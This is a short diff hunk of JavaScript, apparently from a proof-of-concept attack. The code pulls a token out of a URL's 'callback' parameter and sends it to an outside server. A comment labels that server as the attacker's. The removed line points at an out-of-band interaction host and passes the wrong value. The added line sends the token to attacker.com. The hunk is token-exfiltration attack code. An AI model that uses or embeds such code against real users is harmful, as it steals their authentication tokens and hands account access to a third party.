@@ -9,7 +9,7 @@
                 var token = decodeURIComponent(url.split('callback=')[1]);
                 // Send the token to the attacker's server
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://xjhqloheesngodljevxqvjgd7mjynh9e8.oast.fun/?token='+encodeURIComponent);
+                xhr.open('GET', 'https://attacker.com/?token=' + token);
                 xhr.send();
             }
         });
